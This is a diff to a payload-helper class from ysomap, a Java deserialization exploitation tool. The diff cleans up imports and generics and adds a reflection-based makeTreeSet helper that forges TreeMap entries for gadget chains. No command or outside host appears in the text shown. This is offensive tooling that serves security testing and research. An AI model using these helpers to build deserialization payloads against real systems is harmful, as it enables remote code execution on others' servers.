@@ -3,9 +3,14 @@ package ysomap.core.util;
 import ysomap.common.exception.GenerateErrorException;
 import ysomap.core.ObjectGadget;
 
-import java.lang.reflect.*;
+import java.lang.reflect.Array;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
 import java.util.HashMap;
 import java.util.Map;
+import java.util.TreeMap;
+import java.util.TreeSet;
 
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
 
@@ -30,11 +35,9 @@ public class PayloadHelper {
         return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
     }
 
-
     public static InvocationHandler createMemoizedInvocationHandler (final Map<String, Object> map ) throws Exception {
         return (InvocationHandler) ReflectionHelper.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
     }
-
 
     public static <T> T createProxy ( final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
         final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
@@ -47,15 +50,12 @@ public class PayloadHelper {
 
 
     public static Map<String, Object> createMap ( final String key, final Object val ) {
-        final Map<String, Object> map = new HashMap<String, Object>();
+        final Map<String, Object> map = new HashMap<>();
         map.put(key, val);
         return map;
     }
 
-
-
-    public static HashMap makeMap ( Object v1, Object v2 ) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
-            IllegalAccessException, InvocationTargetException {
+    public static HashMap makeMap ( Object v1, Object v2 ) throws Exception{
         HashMap s = new HashMap();
         ReflectionHelper.setFieldValue(s, "size", 2);
         Class nodeC;
@@ -73,6 +73,23 @@ public class PayloadHelper {
         Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
         ReflectionHelper.setFieldValue(s, "table", tbl);
         return s;
+    }
+
+    public static TreeSet makeTreeSet(Object v1, Object v2) throws Exception {
+        TreeMap<Object,Object> m = new TreeMap<>();
+        ReflectionHelper.setFieldValue(m, "size", 2);
+        ReflectionHelper.setFieldValue(m, "modCount", 2);
+        Class<?> nodeC = Class.forName("java.util.TreeMap$Entry");
+        Constructor nodeCons = nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);
+        ReflectionHelper.setAccessible(nodeCons);
+        Object node = nodeCons.newInstance(v1, new Object[0], null);
+        Object right = nodeCons.newInstance(v2, new Object[0], node);
+        ReflectionHelper.setFieldValue(node, "right", right);
+        ReflectionHelper.setFieldValue(m, "root", node);
+
+        TreeSet set = new TreeSet();
+        ReflectionHelper.setFieldValue(set, "m", m);
+        return set;
     }
 
     public static String defaultTestCommand(){
